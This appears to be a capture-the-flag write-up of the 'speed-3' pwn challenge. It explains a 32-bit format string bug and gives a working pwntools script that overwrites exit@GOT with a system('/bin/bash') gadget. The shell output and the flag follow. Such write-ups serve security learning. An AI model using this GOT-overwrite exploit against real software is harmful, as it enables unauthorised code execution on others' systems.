## CTF Writeup: Midnight Sun CTF - speed-3

**Category:** Pwn / Binary Exploitation **Architecture:** i386 (32-bit) **Protections:** Canary found, NX enabled, No PIE, Partial RELRO

---

### 1. Challenge Overview

The challenge provides a 32-bit Linux executable. Upon execution, it prompts for input with `fsb:` (Format String Binary), prints the input, and then terminates. The goal is to exploit a format string vulnerability to gain a shell.

### 2. Vulnerability Analysis

The binary uses `printf(buffer)` where `buffer` is user-controlled, without a format specifier. This is a classic **Format String Vulnerability**.

**Constraints:**

- **Non-looping:** The program runs once and exits. We cannot leak an address and then send a second payload.
    
- **32-bit Calling Convention:** Unlike x64, arguments are passed on the stack.
    

---

### 3. Exploitation Strategy

Since the program does not loop, overwriting the Global Offset Table (GOT) of `printf` with `system` during the `printf` call is ineffective because there are no subsequent `printf` calls.

Instead, we target the **`exit()`** function. When `main` returns or `exit` is called, the program looks up the address in the GOT. If we replace the address of `exit` with a "win" gadget, we can redirect execution.

#### A. Identifying the Offset

By sending a pattern like `AAAA %p %p %p %p %p %p %p %p`, we determined that our input buffer starts at **offset 7** on the stack.

#### B. Finding a "Win" Gadget

Searching the binary for `system` calls, we found a code block at `0x080491ea`:

Plaintext

```
 80491ea:       68 08 a0 04 08          push   $0x804a008  ; Pointer to "/bin/bash"
 80491ef:       e8 9c fe ff ff          call   8049090     ; call system@plt
```

Jumping to `0x080491ea` is ideal because it manually pushes the argument onto the stack before calling `system`, satisfying the 32-bit calling convention.

### 4. The Exploit

The exploit performs the following steps:

1. Locate `exit@GOT` (`0x0804c01c`).
    
2. Craft a format string to write the address `0x080491ea` into `0x0804c01c`.
    
3. Send the payload and drop into an interactive shell.
    

**Exploit Script (Python/Pwntools):**

Python

```
from pwn import *

elf = ELF('./speed3')
p = remote('speed3.play.ctf.se', 9233)

offset = 7
target_got = elf.got['exit']
win_gadget = 0x080491ea 

# Generate payload to overwrite exit@GOT with our gadget
payload = fmtstr_payload(offset, {target_got: win_gadget})

p.sendlineafter(b'fsb:', payload)
p.interactive()
```

---

### 5. Execution and Flag

Running the exploit redirects the program's exit sequence to the `system("/bin/bash")` call.

Bash

```
$ id
uid=999(ctf) gid=999(ctf) groups=999(ctf)
$ ls
flag  run.sh  speed3
$ cat flag
midnight{a3002d8bbb533d1162f2bafc59772c11}
```

**Flag:** `midnight{a3002d8bbb533d1162f2bafc59772c11}`

### 6. Lessons Learned

- **One-Shot Exploits:** In non-looping binaries, target `exit@GOT` or `__stack_chk_fail@GOT`.
    
- **Gadgets over PLT:** In 32-bit pwn, jumping to a gadget that handles the `push` of an argument is significantly more reliable than jumping directly to `system@PLT`.
